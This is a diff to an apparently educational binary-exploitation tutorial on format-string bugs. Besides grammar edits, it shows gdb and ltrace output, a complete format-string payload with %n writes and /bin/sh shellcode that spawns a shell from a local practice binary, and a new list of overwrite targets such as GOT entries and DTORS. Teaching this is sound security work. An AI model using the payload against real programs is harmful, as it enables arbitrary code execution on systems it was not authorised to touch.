@@ -972,7 +972,7 @@ strncpy(0xffffcf68, "\374\317\377\377\376\317\377\377%53038u%6$n%12489u%7$n\353\
 printf("\374\317\377\377\376\317\377\377%53038u%6$n%12489u%7$n\353\v"..., 4294955730, 0xc8, 134517204, 0��������
 ~~~
 
-It shows that the input string is placed at `0xffffcf68`. So, it says that the string is copied to this address. Lets determine this address inside gdb and next calculate the offset.
+It shows that the input string is placed at `0xffffcf68`. So, it says that the string is copied to this address. Let's determine this address inside gdb and next calculate the offset.
 
 ~~~bash
 gef➤  unset environment LINES
@@ -1050,14 +1050,14 @@ gef➤  x/100wx $esp - 0x100
 gef➤  
 ~~~
 
-You can see that the address where the strncpy function placed our input string is `0xffffcf08`. Thus, you need to determine the offset and do all calculations for exploit. I just show you my final exploit.
+You can see that the address where the strncpy function placed our input string is `0xffffcf08`. Thus, you need to determine the offset and do all calculations for the exploit. I just show you my final exploit.
 
 ~~~bash
 shogun@kyoto:~/repos/basics-of-pwn/content/format-string$ ./format-string $(python -c 'print "\x4c\xd0\xff\xff" + "\x4e\xd0\xff\xff" + "%53120u" + "%6$n" + "%12407u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
 L���N���
 
 =========================
-Long empty output here...
+The long empty output here...
 =========================
 
 200�$ w
@@ -1067,4 +1067,25 @@ shogun   tty7     :0               10:53   37:01   1:42   1.25s xfce4-session
 $
 ~~~
 
-Okay, you can say that if we wouldn't have ltrace tool then we couldn't exploit the vulnerability. It is not true. Don't forget about brute-force attack and pwntools. With some brute-force script that will do all calculation and execute the exploit sooner or later you will get a shell.
+Okay, you can say that if we wouldn't have a ltrace tool then we couldn't exploit the vulnerability. It is not true. Don't forget about brute-force attack and pwntools. With some brute-force script that will do all calculations and execute the exploit sooner or later, you will get a shell.
+
+## What else can you overwrite with a format string
+
+With the format string, you will discover many ways of exploitation.
+
+Format string variants of exploitation:
+
+1. Overwrite the saved return address.
+2. Overwrite another application-specific function pointer.
+3. Overwrite a pointer to an exception handler, then cause an exception.
+4. Overwrite a GOT entry.
+5. Overwrite the atexit handler.
+6. Overwrite entries in the DTORS section.
+7. Turn a format string bug into a stack or heap overflow by overwriting a null terminator with non-null data.
+8. Write application-specific data such as stored UID or GID values with values of your choice.
+9. Modify strings containing commands to reflect commands of your choice.
+
+I will show here, how to overwrite a GOT entry.
+
+Consider the program:
+```
